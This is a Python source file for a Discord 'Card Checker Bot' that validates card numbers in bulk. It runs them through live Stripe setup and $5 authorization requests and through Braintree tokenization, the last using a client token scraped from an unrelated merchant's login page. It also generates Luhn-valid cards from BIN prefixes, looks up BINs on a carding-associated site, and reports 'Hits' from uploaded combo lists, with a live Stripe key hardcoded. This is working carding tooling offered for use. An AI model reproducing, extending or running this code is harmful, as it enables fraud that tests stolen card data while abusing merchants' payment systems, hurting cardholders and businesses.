import discord
from discord.ext import commands
from flask import Flask, jsonify
import requests
import re
import threading
import random
import string
import os
import time
import json as jsonlib
import asyncio
import io

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

STRIPE_PK      = 'pk_live_51MgIkiBwwUGLw5P5hXUTaTTCvbR7ypj8SxOHBCNqrjjDIsH3iXYymAtHELIxHoWlJBhv50Hb6Ixffm6hAzVxf9Bw00eHyhdNf8'
STRIPE_SK      = os.environ.get('STRIPE_SK', '')
DISCORD_TOKEN  = os.environ.get('DISCORD_TOKEN', '')

# ---------------------------------------------------------------------------
# Flask (keep-alive / health check)
# ---------------------------------------------------------------------------

flask_app = Flask(__name__)

@flask_app.route('/')
def health():
    return jsonify({"status": "ok", "bot": "discord"})

def run_flask():
    flask_app.run(host='0.0.0.0', port=5000, use_reloader=False)

# ---------------------------------------------------------------------------
# Discord bot
# ---------------------------------------------------------------------------

intents = discord.Intents.default()
intents.message_content = True          # must be ON in Dev Portal → Bot → Privileged

bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

# ---------------------------------------------------------------------------
# Utility helpers
# ---------------------------------------------------------------------------

def safe_json(r):
    try:
        return r.json()
    except Exception:
        return None

def make_session():
    s = requests.Session()
    s.headers['User-Agent'] = (
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
        'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36'
    )
    return s

def random_email():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + '@gmail.com'

def parse_card(text):
    """Accept cc|mm|yy|cvv or cc/mm/yy/cvv or cc mm yy cvv."""
    parts = re.split(r'[|/ ]+', text.strip())
    return parts if len(parts) == 4 else None

# ---------------------------------------------------------------------------
# Luhn / card generator
# ---------------------------------------------------------------------------

def _luhn_complete(partial: str) -> str | None:
    for d in range(10):
        c = partial + str(d)
        s = sum(
            sum(divmod(int(x) * (1 + (i % 2 == len(c) % 2)), 10))
            for i, x in enumerate(c)
        )
        if s % 10 == 0:
            return c
    return None

def gen_cards(bin_prefix: str, count: int = 10) -> list[str]:
    bin_prefix = re.sub(r'\D', '', bin_prefix)
    cards, seen = [], set()
    attempts = 0
    while len(cards) < count and attempts < count * 20:
        attempts += 1
        pad = 15 - len(bin_prefix)
        if pad < 0:
            break
        mid = ''.join(random.choices(string.digits, k=pad))
        full = _luhn_complete(bin_prefix + mid)
        if full and full not in seen:
            seen.add(full)
            mm  = str(random.randint(1, 12)).zfill(2)
            yy  = str(random.randint(2025, 2030))
            cvv = ''.join(random.choices(string.digits, k=3))
            cards.append(f"{full}|{mm}|{yy}|{cvv}")
    return cards

# ---------------------------------------------------------------------------
# Stripe token
# ---------------------------------------------------------------------------

def get_stripe_token(cc, mm, yy, cvv, pk=None):
    if len(yy) == 4:
        yy = yy[-2:]
    pk = pk or STRIPE_PK
    try:
        r = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            data=f'type=card&card[number]={cc}&card[cvc]={cvv}'
                 f'&card[exp_year]={yy}&card[exp_month]={mm}&key={pk}',
            timeout=30
        )
        j = safe_json(r)
        if j is None:
            return None, f'Non-JSON response (HTTP {r.status_code})'
        if r.status_code != 200:
            return None, (j.get('error') or {}).get('message') or f'HTTP {r.status_code}'
        return j.get('id'), None
    except Exception as e:
        return None, str(e)

# ---------------------------------------------------------------------------
# Gateways
# ---------------------------------------------------------------------------

def stripe_auth_check(cc, mm, yy, cvv):
    if not STRIPE_SK:
        return {"status": "Error", "response": "STRIPE_SK not configured.", "decline_type": "config"}
    token, err = get_stripe_token(cc, mm, yy, cvv)
    if not token:
        return {"status": "Declined", "response": err, "decline_type": "card_error"}
    try:
        r = requests.post(
            'https://api.stripe.com/v1/setup_intents',
            data={
                'payment_method': token,
                'confirm': 'true',
                'usage': 'off_session',
                'automatic_payment_methods[enabled]': 'true',
                'automatic_payment_methods[allow_redirects]': 'never',
            },
            auth=(STRIPE_SK, ''), timeout=30
        )
        j = safe_json(r)
        if j is None:
            return {"status": "Error", "response": f"Stripe HTTP {r.status_code}", "decline_type": "api_error"}
        s = j.get('status', '')
        if s == 'succeeded':
            return {"status": "Approved", "response": "Payment method verified", "decline_type": "none"}
        if s == 'requires_action':
            return {"status": "Declined", "response": "3D Secure required", "decline_type": "3ds"}
        msg = (j.get('last_setup_error') or j.get('error') or {}).get('message') or s or str(j)[:80]
        return {"status": "Declined", "response": msg, "decline_type": "card_decline"}
    except Exception as e:
        return {"status": "Error", "response": str(e), "decline_type": "exception"}


def _setup_intent_check(token: str) -> dict:
    """Shared SetupIntent check used by both SA and SC fallback."""
    r = requests.post(
        'https://api.stripe.com/v1/setup_intents',
        data={
            'payment_method': token,
            'confirm': 'true',
            'usage': 'off_session',
            'automatic_payment_methods[enabled]': 'true',
            'automatic_payment_methods[allow_redirects]': 'never',
        },
        auth=(STRIPE_SK, ''), timeout=30
    )
    j = safe_json(r)
    if j is None:
        return {"status": "Error", "response": f"Stripe HTTP {r.status_code}", "decline_type": "api_error"}
    s = j.get('status', '')
    if s == 'succeeded':
        return {"status": "Approved", "response": "Card verified", "decline_type": "none"}
    if s == 'requires_action':
        return {"status": "Declined", "response": "3D Secure required", "decline_type": "3ds"}
    msg = (j.get('last_setup_error') or j.get('error') or {}).get('message') or s or str(j)[:80]
    return {"status": "Declined", "response": msg, "decline_type": "card_decline"}


def stripe_auth_check(cc, mm, yy, cvv):
    if not STRIPE_SK:
        return {"status": "Error", "response": "STRIPE_SK not configured.", "decline_type": "config"}
    token, err = get_stripe_token(cc, mm, yy, cvv)
    if not token:
        return {"status": "Declined", "response": err, "decline_type": "card_error"}
    try:
        return _setup_intent_check(token)
    except Exception as e:
        return {"status": "Error", "response": str(e), "decline_type": "exception"}


def stripe_charge_check(cc, mm, yy, cvv):
    if not STRIPE_SK:
        return {"status": "Error", "response": "STRIPE_SK not configured.", "decline_type": "config"}
    token, err = get_stripe_token(cc, mm, yy, cvv)
    if not token:
        return {"status": "Declined", "response": err, "decline_type": "card_error"}
    try:
        r = requests.post(
            'https://api.stripe.com/v1/payment_intents',
            data={
                'amount': '500',
                'currency': 'usd',
                'payment_method': token,
                'confirm': 'true',
                'capture_method': 'manual',
                'automatic_payment_methods[enabled]': 'true',
                'automatic_payment_methods[allow_redirects]': 'never',
            },
            auth=(STRIPE_SK, ''), timeout=30
        )
        j = safe_json(r)
        if j is None:
            return {"status": "Error", "response": f"Stripe HTTP {r.status_code}", "decline_type": "api_error"}

        # If account is not activated for charges, fall back to SetupIntent
        err_msg = (j.get('error') or {}).get('message', '')
        if 'cannot currently make live charges' in err_msg or \
           'activate your account' in err_msg or \
           (j.get('error') or {}).get('code') in ('account_invalid', 'live_mode_test_card'):
            return _setup_intent_check(token)

        s = j.get('status', '')
        if s in ('requires_capture', 'succeeded'):
            pid = j.get('id')
            if pid and s == 'requires_capture':
                try:
                    requests.post(
                        f'https://api.stripe.com/v1/payment_intents/{pid}/cancel',
                        auth=(STRIPE_SK, ''), timeout=15
                    )
                except Exception:
                    pass
            return {"status": "Approved", "response": "$5 authorization successful", "decline_type": "none"}
        if s == 'requires_action':
            return {"status": "Declined", "response": "3D Secure required", "decline_type": "3ds"}

        lpe = (j.get('last_payment_error') or j.get('error') or {}).get('message', '')
        if 'cannot currently make live charges' in lpe or 'activate your account' in lpe:
            return _setup_intent_check(token)

        msg = lpe or s or str(j)[:80]
        return {"status": "Declined", "response": msg, "decline_type": "card_decline"}
    except Exception as e:
        return {"status": "Error", "response": str(e), "decline_type": "exception"}


def braintree_check(cc, mm, yy, cvv):
    session = make_session()
    try:
        if len(yy) == 2:
            yy = '20' + yy
        page = session.get('https://www.skinsort.com/login', timeout=30)
        m = (
            re.search(r'"clientToken"\s*:\s*"([A-Za-z0-9+/=]+)"', page.text)
            or re.search(r'clientToken\s*=\s*["\']([^"\']+)["\']', page.text)
        )
        if not m:
            return {"status": "Error", "response": "No Braintree token found on target site.", "decline_type": "site_error"}
        import base64
        try:
            raw  = base64.b64decode(m.group(1)).decode()
            auth = jsonlib.loads(raw).get('authorizationFingerprint') or m.group(1)
        except Exception:
            auth = m.group(1)
        r = session.post(
            'https://payments.braintree-api.com/graphql',
            json={
                "query": (
                    "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) "
                    "{ tokenizeCreditCard(input: $input) "
                    "{ token creditCard { bin last4 } } }"
                ),
                "variables": {"input": {"creditCard": {
                    "number": cc, "expirationMonth": mm,
                    "expirationYear": yy, "cvv": cvv
                }}}
            },
            headers={
                'Authorization': f'Bearer {auth}',
                'Content-Type': 'application/json',
                'Braintree-Version': '2018-05-10',
            },
            timeout=30
        )
        j = safe_json(r)
        if j is None:
            return {"status": "Error", "response": f"Braintree HTTP {r.status_code}", "decline_type": "api_error"}
        if j.get('errors'):
            return {"status": "Declined", "response": j['errors'][0].get('message', 'Tokenization failed'), "decline_type": "card_decline"}
        tok = ((j.get('data') or {}).get('tokenizeCreditCard') or {}).get('token')
        if not tok:
            return {"status": "Declined", "response": "No token returned", "decline_type": "card_decline"}
        return {"status": "Approved", "response": "Card tokenized successfully", "decline_type": "none"}
    except requests.exceptions.Timeout:
        return {"status": "Error", "response": "Braintree request timed out.", "decline_type": "timeout"}
    except Exception as e:
        return {"status": "Error", "response": str(e), "decline_type": "exception"}

# ---------------------------------------------------------------------------
# BIN info
# ---------------------------------------------------------------------------

def get_bin_info(cc: str) -> dict:
    try:
        r = requests.get(f'https://bins.antipublic.cc/bins/{cc[:6]}', timeout=8)
        return safe_json(r) or {}
    except Exception:
        return {}

# ---------------------------------------------------------------------------
# Embed builders
# ---------------------------------------------------------------------------

GATEWAYS = {
    'sa': (stripe_auth_check,   'Stripe Auth',   '[SA]'),
    'sc': (stripe_charge_check, 'Stripe Charge', '[SC]'),
    'bt': (braintree_check,     'Braintree',     '[BT]'),
}

def _status_color(status: str) -> int:
    return {'Approved': 0x2ecc71, 'Declined': 0xe74c3c}.get(status, 0xf39c12)

def embed_processing(card_str: str, gw_name: str, gw_tag: str) -> discord.Embed:
    e = discord.Embed(
        title=f"{gw_tag} Checking — {gw_name}",
        color=0xf39c12
    )
    e.add_field(name="Card", value=f"```{card_str}```", inline=False)
    e.set_footer(text="Please wait...")
    return e

def embed_result(card_str: str, result: dict, bin_info: dict, gw_name: str, gw_tag: str) -> discord.Embed:
    status   = result.get('status', 'Declined')
    response = result.get('response', '-')

    status_label = 'APPROVED' if status == 'Approved' else ('DECLINED' if status == 'Declined' else 'ERROR')

    e = discord.Embed(
        title=f"{gw_tag} {status_label} — {gw_name}",
        color=_status_color(status)
    )
    e.add_field(name="Card",     value=f"```{card_str}```",  inline=False)
    e.add_field(name="Response", value=f"```{response}```",  inline=False)

    bank    = bin_info.get('bank', 'Unknown')
    country = bin_info.get('country_name', 'Unknown')
    flag    = bin_info.get('country_flag', '')
    brand   = bin_info.get('brand', 'Unknown')
    ctype   = bin_info.get('type', 'Unknown')

    e.add_field(name="Issuer",   value=bank,                  inline=True)
    e.add_field(name="Country",  value=f"{flag} {country}",   inline=True)
    e.add_field(name="Network",  value=f"{brand} {ctype}",    inline=True)
    e.set_footer(text="Card Checker Bot")
    return e

def embed_error(title: str, desc: str) -> discord.Embed:
    return discord.Embed(title=f"Error — {title}", description=desc, color=0xf39c12)

# ---------------------------------------------------------------------------
# Shared check runner (single card)
# ---------------------------------------------------------------------------

async def do_single_check(ctx, card_str: str, gw_key: str):
    parts = parse_card(card_str)
    if not parts:
        await ctx.send(embed=embed_error(
            "Invalid Format",
            f"Use: `!{gw_key} cc|mm|yy|cvv`\nExample: `!{gw_key} 4111111111111111|12|2026|123`"
        ))
        return

    cc, mm, yy, cvv = parts
    full = f"{cc}|{mm}|{yy}|{cvv}"
    fn, name, tag = GATEWAYS[gw_key]

    msg = await ctx.send(embed=embed_processing(full, name, tag))

    def run():
        result   = fn(cc, mm, yy, cvv)
        bin_info = get_bin_info(cc)
        emb      = embed_result(full, result, bin_info, name, tag)
        asyncio.run_coroutine_threadsafe(msg.edit(embed=emb), bot.loop)

    threading.Thread(target=run, daemon=True).start()

# ---------------------------------------------------------------------------
# Prefix Commands
# ---------------------------------------------------------------------------

@bot.command(name='sa')
async def cmd_sa(ctx, *, card: str = ''):
    """Stripe Auth — $0 hold via SetupIntent"""
    if not card:
        await ctx.send(embed=embed_error("Missing card", "Usage: `!sa cc|mm|yy|cvv`"))
        return
    await do_single_check(ctx, card.strip(), 'sa')


@bot.command(name='sc')
async def cmd_sc(ctx, *, card: str = ''):
    """Stripe Charge — $5 auth (not captured)"""
    if not card:
        await ctx.send(embed=embed_error("Missing card", "Usage: `!sc cc|mm|yy|cvv`"))
        return
    await do_single_check(ctx, card.strip(), 'sc')


@bot.command(name='bt')
async def cmd_bt(ctx, *, card: str = ''):
    """Braintree tokenization check"""
    if not card:
        await ctx.send(embed=embed_error("Missing card", "Usage: `!bt cc|mm|yy|cvv`"))
        return
    await do_single_check(ctx, card.strip(), 'bt')


@bot.command(name='gen')
async def cmd_gen(ctx, bin_prefix: str = '', amount: str = '10'):
    """Generate Luhn-valid cards from a BIN prefix"""
    if not bin_prefix:
        await ctx.send(embed=embed_error("Missing BIN", "Usage: `!gen <bin> [amount]`\nExample: `!gen 411111 10`"))
        return
    try:
        n = max(1, min(20, int(amount)))
    except ValueError:
        n = 10
    clean = re.sub(r'\D', '', bin_prefix)
    if len(clean) < 6:
        await ctx.send(embed=embed_error("Invalid BIN", "BIN must be at least 6 digits."))
        return
    cards = gen_cards(clean, n)
    if not cards:
        await ctx.send(embed=embed_error("Generation Failed", "Could not generate valid cards for that BIN."))
        return
    e = discord.Embed(
        title=f"[GEN] Generated Cards — BIN {clean}",
        color=0x5865f2
    )
    e.add_field(name=f"{len(cards)} cards", value=f"```\n{chr(10).join(cards)}\n```", inline=False)
    e.set_footer(text="Luhn-valid | Random expiry & CVV")
    await ctx.send(embed=e)


@bot.command(name='combo')
async def cmd_combo(ctx, gateway: str = ''):
    """
    Check cards from an uploaded .txt file.
    Usage:  !combo sa  (attach a .txt file with one card per line)
    Format: cc|mm|yy|cvv  or  cc/mm/yy/cvv
    """
    gw_key = gateway.lower()
    if gw_key not in GATEWAYS:
        await ctx.send(embed=embed_error(
            "Invalid Gateway",
            "Usage: `!combo <gateway> [attach .txt file]`\n"
            "Gateways: `sa` · `sc` · `bt`\n\n"
            "Example: `!combo sa` (with a .txt file attached)"
        ))
        return

    attach = ctx.message.attachments
    if not attach:
        await ctx.send(embed=embed_error(
            "No File Attached",
            "Please attach a `.txt` file with one card per line.\n"
            "Format: `cc|mm|yy|cvv`"
        ))
        return

    fn, gw_name, gw_tag = GATEWAYS[gw_key]

    try:
        raw = await attach[0].read()
        lines = raw.decode('utf-8', errors='ignore').splitlines()
    except Exception as ex:
        await ctx.send(embed=embed_error("File Read Error", str(ex)))
        return

    cards = []
    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        p = parse_card(line)
        if p:
            cards.append(p)

    if not cards:
        await ctx.send(embed=embed_error("No Valid Cards", "No valid `cc|mm|yy|cvv` lines found in the file."))
        return

    total    = len(cards)
    approved = []
    declined = []
    errors   = []

    def progress_embed(done: int) -> discord.Embed:
        pct = int((done / total) * 20)
        bar = '█' * pct + '░' * (20 - pct)
        e   = discord.Embed(
            title=f"{gw_tag} Combo Check — {gw_name}",
            color=0xf39c12
        )
        e.add_field(name="Progress", value=f"`[{bar}]` {done}/{total}", inline=False)
        e.add_field(name="Approved", value=str(len(approved)), inline=True)
        e.add_field(name="Declined", value=str(len(declined)), inline=True)
        e.add_field(name="Errors",   value=str(len(errors)),   inline=True)
        e.set_footer(text="Running...")
        return e

    status_msg = await ctx.send(embed=progress_embed(0))

    def run_combo():
        for i, (cc, mm, yy, cvv) in enumerate(cards, 1):
            full = f"{cc}|{mm}|{yy}|{cvv}"
            try:
                res = fn(cc, mm, yy, cvv)
                s   = res.get('status', '')
                if s == 'Approved':
                    approved.append(f"{full} | {res['response']}")
                elif s == 'Declined':
                    declined.append(full)
                else:
                    errors.append(f"{full} | {res['response']}")
            except Exception as ex:
                errors.append(f"{full} | {ex}")

            if i % 5 == 0 or i == total:
                asyncio.run_coroutine_threadsafe(
                    status_msg.edit(embed=progress_embed(i)),
                    bot.loop
                )

        color = 0x2ecc71 if approved else 0xe74c3c
        final = discord.Embed(
            title=f"{gw_tag} Combo Done — {gw_name}",
            color=color
        )
        final.add_field(name="Total",    value=str(total),         inline=True)
        final.add_field(name="Approved", value=str(len(approved)), inline=True)
        final.add_field(name="Declined", value=str(len(declined)), inline=True)

        if approved:
            hits = '\n'.join(approved[:20])
            if len(approved) > 20:
                hits += f'\n...and {len(approved) - 20} more'
            final.add_field(name="Hits", value=f"```\n{hits}\n```", inline=False)

        final.set_footer(text="Combo check complete")
        asyncio.run_coroutine_threadsafe(status_msg.edit(embed=final), bot.loop)

    threading.Thread(target=run_combo, daemon=True).start()


@bot.command(name='help')
async def cmd_help(ctx):
    """Show all commands"""
    e = discord.Embed(
        title="Card Checker Bot",
        description="Fast and accurate card checking via Stripe & Braintree.\nNo false positives.",
        color=0x5865f2
    )
    e.add_field(
        name="Single Card",
        value=(
            "`!sa cc|mm|yy|cvv` — Stripe Auth (SetupIntent, $0 hold)\n"
            "`!sc cc|mm|yy|cvv` — Stripe Charge ($5 auth, not captured)\n"
            "`!bt cc|mm|yy|cvv` — Braintree tokenization"
        ),
        inline=False
    )
    e.add_field(
        name="Combo / Bulk (attach .txt file)",
        value=(
            "`!combo sa` — check all cards via Stripe Auth\n"
            "`!combo sc` — check all cards via Stripe Charge\n"
            "`!combo bt` — check all cards via Braintree\n"
            "One `cc|mm|yy|cvv` per line in the file"
        ),
        inline=False
    )
    e.add_field(
        name="Generator",
        value=(
            "`!gen <bin> [amount]` — generate Luhn-valid cards\n"
            "Example: `!gen 411111 10`"
        ),
        inline=False
    )
    e.add_field(
        name="Card Format",
        value="`cc|mm|yy|cvv`  or  `cc/mm/yy/cvv`\nExample: `4111111111111111|12|2026|123`",
        inline=False
    )
    e.set_footer(text="Card Checker Bot  |  !help")
    await ctx.send(embed=e)

# ---------------------------------------------------------------------------
# Bot events
# ---------------------------------------------------------------------------

@bot.event
async def on_ready():
    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name="!help  |  Card Checker"
        )
    )
    print(f"[+] Logged in as {bot.user}  (id: {bot.user.id})")
    print(f"[+] Prefix: !  |  Stripe SK: {'✓' if STRIPE_SK else '✗ MISSING'}")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(embed=embed_error("Missing Argument", str(error)))
        return
    print(f"[!] Command error: {error}")

# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == '__main__':
    threading.Thread(target=run_flask, daemon=True).start()
    if not DISCORD_TOKEN:
        print("ERROR: DISCORD_TOKEN not set.")
    else:
        bot.run(DISCORD_TOKEN, log_handler=None)
